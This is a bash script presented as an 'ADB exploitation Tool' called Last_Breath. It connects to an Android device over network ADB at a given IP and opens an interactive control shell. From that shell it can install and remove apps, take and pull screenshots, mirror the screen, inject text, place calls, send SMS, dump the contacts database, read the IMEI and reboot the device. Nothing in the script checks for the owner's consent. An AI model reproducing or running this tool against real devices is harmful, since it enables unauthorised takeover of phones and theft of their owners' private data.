function adb_Server(){
    echo -e "\e[32m[+]\e[0m \033[1mStoping ADB server\033[0m"
    adb kill-server &>/dev/null
    echo -e "\e[32m[+]\e[0m \033[1mStarting ADB server\033[0m"
    adb start-server &>/dev/null
    clear
}
function logo(){
    echo -e """
\033[32m╔╗\033[31m────────\033[32m╔╗\033[31m──\033[32m╔══╗\033[31m────────\033[32m╔╗╔╗
║║\033[31m───────\033[32m╔╝╚╗\033[31m─\033[32m║╔╗║\033[31m───────\033[32m╔╝╚╣║
║║──╔══╦═╩╗╔╝─║╚╝╚╦═╦══╦═╩╗╔╣╚═╗
║║─╔╣╔╗║══╣╠══╣╔═╗║╔╣║═╣╔╗║║║╔╗║
║╚═╝║╔╗╠══║╚╦═╣╚═╝║║║║═╣╔╗║╚╣║║║ [\033[31mADB exploitation Tool\033[32m]
╚═══╩╝╚╩══╩═╝─╚═══╩╝╚══╩╝╚╩═╩╝╚╝\033[0m 

    """
}
function help(){
    echo """
command              description
-------              -----------
help                 show this help
clear                clear the screen
exit                 exit the program
devices              show the connected devices
info                 show device info
battery_level        show battery level
set-battery          set battery level (0-100)
set-usb              set usb status (on/off)
reset-battery        reset battery
screen-on            turn on screen
screen-off           turn off screen
reboot               reboot device
reboot-recovery      reboot to recovery
reboot-bootloader    reboot to bootloader
reboot-system        reboot to system
install              install apk (Example: install apk_path)
uninstall            uninstall apk (Example: uninstall package_name)
screenshot           take screenshot
openurl              open url (Example: openurl https://example.com)
ls                   list files
scrcpy               live screen mirroring
input                input text (Ex: input 'hi')
call                 call number (Example: call +923331234567)
send-sms             send sms (Example: send-sms +1234567 'hi)
youtube-play         play video from youtube (Example: youtube-play https://www.youtube.com/watch?v=dQw4w9WgXcQ) 
dump-contacts        dump contacts (Example: dump-contact)  
wifi-on              turn on wifi
wifi-off             turn off wifi
imei                 show imei
"""
}
function device_info(){
android_version=$(adb shell getprop ro.build.version.release)
android_model=$(adb shell getprop ro.product.model)
android_brand=$(adb shell getprop ro.product.brand)
android_device=$(adb shell getprop ro.product.device)
android_serial=$(adb shell getprop ro.serialno)
android_manufacturer=$(adb shell getprop ro.product.manufacturer)
android_board=$(adb shell getprop ro.product.board)
android_bootloader=$(adb shell getprop ro.bootloader)
android_hardware=$(adb shell getprop ro.hardware)
android_fingerprint=$(adb shell getprop ro.build.fingerprint)
android_id=$(adb shell getprop ro.build.id)
android_incremental=$(adb shell getprop ro.build.version.incremental)
android_sdk=$(adb shell getprop ro.build.version.sdk)
android_sdk_codename=$(adb shell getprop ro.build.version.codename)
android_sdk_release=$(adb shell getprop ro.build.version.release)
android_sdk_security=$(adb shell getprop ro.build.version.security_patch)
echo -e """
\e[32m[+]\e[0m \033[1mDevice Info\033[0m
\e[32m[+]\e[0m \033[1mAndroid Version\033[0m : \033[31m$android_version\033[0m
\e[32m[+]\e[0m \033[1mAndroid Model\033[0m : \033[31m$android_model\033[0m
\e[32m[+]\e[0m \033[1mAndroid Brand\033[0m : \033[31m$android_brand\033[0m
\e[32m[+]\e[0m \033[1mAndroid Device\033[0m : \033[31m$android_device\033[0m
\e[32m[+]\e[0m \033[1mAndroid Serial\033[0m : \033[31m$android_serial\033[0m
\e[32m[+]\e[0m \033[1mAndroid Manufacturer\033[0m : \033[31m$android_manufacturer\033[0m
\e[32m[+]\e[0m \033[1mAndroid Board\033[0m : \033[31m$android_board\033[0m
\e[32m[+]\e[0m \033[1mAndroid Bootloader\033[0m : \033[31m$android_bootloader\033[0m
\e[32m[+]\e[0m \033[1mAndroid Hardware\033[0m : \033[31m$android_hardware\033[0m
\e[32m[+]\e[0m \033[1mAndroid Fingerprint\033[0m : \033[31m$android_fingerprint\033[0m
\e[32m[+]\e[0m \033[1mAndroid ID\033[0m : \033[31m$android_id\033[0m
\e[32m[+]\e[0m \033[1mAndroid Incremental\033[0m : \033[31m$android_incremental\033[0m
\e[32m[+]\e[0m \033[1mAndroid SDK\033[0m : \033[31m$android_sdk\033[0m
\e[32m[+]\e[0m \033[1mAndroid SDK Codename\033[0m : \033[31m$android_sdk_codename\033[0m
\e[32m[+]\e[0m \033[1mAndroid SDK Release\033[0m : \033[31m$android_sdk_release\033[0m
\e[32m[+]\e[0m \033[1mAndroid SDK Security\033[0m : \033[31m$android_sdk_security\033[0m
"""
}
function send_sms(){
    echo -e "\e[32m[+]\e[0m \033[1mSending SMS to \033[0m\033[31m$1\033[0m"
    adb shell am start -a android.intent.action.SENDTO -d sms:$1  --es  sms_body "$2" --ez exit_on_sent true
    adb shell input keyevent 24
    adb shell input keyevent 66
}
function connected_devices(){
    echo -e "\e[32m[+]\e[0m \033[1mScanning For Connected Devices\033[0m"
    dev=$(adb devices | tail -2 | sed 's/device//' | sed 's/ //g'|sed 's/ //g')
    if [ -z "$dev" ]
    then
     echo -e "\e[31m[-]\e[0m \033[1mNo Device Found\033[0m"
     exit
    else
    echo -e "\e[32m[+]\e[0m \033[1mFound\033[0m\n"
    main_panel $dev
fi
}
function set_battery_level(){
    echo -e "\e[32m[+]\e[0m \033[1mSetting Battery Level to $1\033[0m\n"
    adb shell dumpsys battery set level $1 &> /dev/null
}
function reset_battery(){
    echo -e "\e[32m[+]\e[0m \033[1mResetting Battery\033[0m\n"
    adb shell dumpsys battery reset &> /dev/null
}
function set_usb_status(){
echo -e "\e[32m[+]\e[0m \033[1mSetting USB Status to $1\033[0m\n"
if [ $1 == "on" ]
then
adb shell dumpsys battery set usb 1 &> /dev/null
else
adb shell dumpsys battery set usb 0 &> /dev/null
fi
}
function connection(){
    echo -e "\e[32m[+]\e[0m \033[1mConnecting to the device\033[0m"
    adb connect $1:5555 | grep "connected" > /dev/null && echo -e "\e[31m[X]\e[0m \033[1mConnected\033[0m" && main_panel $1 || echo -e "\e[31m[X]\e[0m \033[1mCan't Connect To The Device\033[0m" && connected_devices
}
function main_panel(){
    
    read -p "last_breath[$1]$> " command
    command_panel $command 
    main_panel $1
}
function command_panel(){
    case $1 in
    "help")
    help
    ;;
    "info")
    device_info
    ;;
    "clear")
    clear
    ;;
    "exit")
    exit
    ;;
    "devices")
    echo -e "\n\e[32m[+]\e[0m \033[1mConnected Devices\033[0m"
    dev=$(adb devices | tail -2 | sed 's/device//' | sed 's/ //g'|sed 's/ //g')
    echo -e "----------------------------------------"
    for device in dev
    do
    echo -e "\e[32m-\e[0m \033[1m$device\033[0m\n"  
    done
    ;;
    "battery_level")
    battery_level=$(adb shell dumpsys battery | grep level | sed 's/level: //')
    echo -e "\n\e[32m-\e[0m \033[1m$battery_level%\033[0m\n"
    ;;
    "set-battery")
    set_battery_level $2
    ;;
    "reset-battery")
    reset_battery
    ;;
    "set-usb")
    set_usb_status $2
    ;;
    "screen-on")
    echo -e "\n\e[32m[+]\e[0m \033[1mTurning Screen On\033[0m\n"
    adb shell input keyevent 26 &> /dev/null
    ;;
    "screen-off")
    echo -e "\n\e[32m[+]\e[0m \033[1mTurning Screen Off\033[0m\n"
    adb shell input keyevent 26 &> /dev/null
    ;;
    "reboot")
    echo -e "\n\e[32m[+]\e[0m \033[1mRebooting\033[0m\n"
    adb reboot &> /dev/null
    ;;
    "reboot-bootloader")
    echo -e "\n\e[32m[+]\e[0m \033[1mRebooting To Bootloader\033[0m\n"
    adb reboot bootloader &> /dev/null
    ;;
    "reboot-recovery")
    echo -e "\n\e[32m[+]\e[0m \033[1mRebooting To Recovery\033[0m\n"
    adb reboot recovery &> /dev/null
    ;;
    "reboot-system")
    echo -e "\n\e[32m[+]\e[0m \033[1mRebooting To System\033[0m\n"
    adb reboot system &> /dev/null
    ;;
    "install")
    echo -e "\n\e[32m[+]\e[0m \033[1mInstalling $2\033[0m\n"
    adb install $2 &> /dev/null
    ;;
    "uninstall")
    echo -e "\n\e[32m[+]\e[0m \033[1mUninstalling $2\033[0m\n"
    adb uninstall $2 &> /dev/null
    ;;
    "screenshot")
    echo -e "\n\e[32m[+]\e[0m \033[1mTaking Screenshot\033[0m\n"
    adb shell screencap -p /sdcard/screenshot.png &> /dev/null
    echo -e "\e[32m[+]\e[0m \033[1mSaving Screenshot\033[0m\n"
    adb pull /sdcard/screenshot.png &> /dev/null
    ;;
    "openurl")
    echo -e "\n\e[32m[+]\e[0m \033[1mOpening $2\033[0m\n"
    adb shell am start -a android.intent.action.VIEW -d $2 &> /dev/null
    ;;
    "ls")
    echo -e "\n\e[32m[+]\e[0m \033[1mListing Files\033[0m\n"
    adb shell ls $2 
    ;;
    "scrcpy")
    echo -e "\n\e[32m[+]\e[0m \033[1mStarting Scrcpy\033[0m\n"
    scrcpy
    ;;
    "input")
    echo -e "\n\e[32m[+]\e[0m \033[1mSending Input\033[0m\n"
    text=$(echo "$@"| sed 's/input //')
    adb shell "input text '$text'" &> /dev/null
    ;;
    "call")
    echo -e "\n\e[32m[+]\e[0m \033[1mCalling $2\033[0m\n"
    adb shell am start -a android.intent.action.CALL -d tel:$2 &> /dev/null
    ;;
    "send-sms")
    send_sms $2 $3
    ;;
    "youtube-play")
    echo -e "\n\e[32m[+]\e[0m \033[1mPlaying Youtube Video\033[0m\n"
    adb shell am start -a android.intent.action.VIEW -d $2 &> /dev/null
    ;;
    "dump-contacts")
    echo -e "\n\e[32m[+]\e[0m \033[1mDumping Contacts\033[0m\n"
    adb shell content query --uri content://com.android.contacts/contacts > contacts.txt
    echo -e "\e[32m[+]\e[0m \033[1mSaving Contacts as contacts.txt\033[0m\n"
    ;;
    "wifi-on")
    echo -e "\n\e[32m[+]\e[0m \033[1mTurning Wifi On\033[0m\n"
    adb shell svc wifi enable &> /dev/null
    ;;
    "wifi-off")
    echo -e "\n\e[32m[+]\e[0m \033[1mTurning Wifi Off\033[0m\n"
    adb shell svc wifi disable &> /dev/null
    ;;
    "imei")
    echo -e "\n\e[32m[+]\e[0m \033[1mGetting IMEI\033[0m\n"
    imei=$(adb shell service call iphonesubinfo 1 | awk -F "'" '{print $2}' | sed '1 d' | tr -d '.' | awk '{print}' ORS=)
    echo -e "\e[32m- \e[0m \033[1m$imei\033[0m\n"
    ;;
    *)
    echo -e "\n\e[31m[X]\e[0m \033[1m$1 Command Not Found\033[0m\n"
    ;;
    esac
}

adb_Server
logo
connection $1
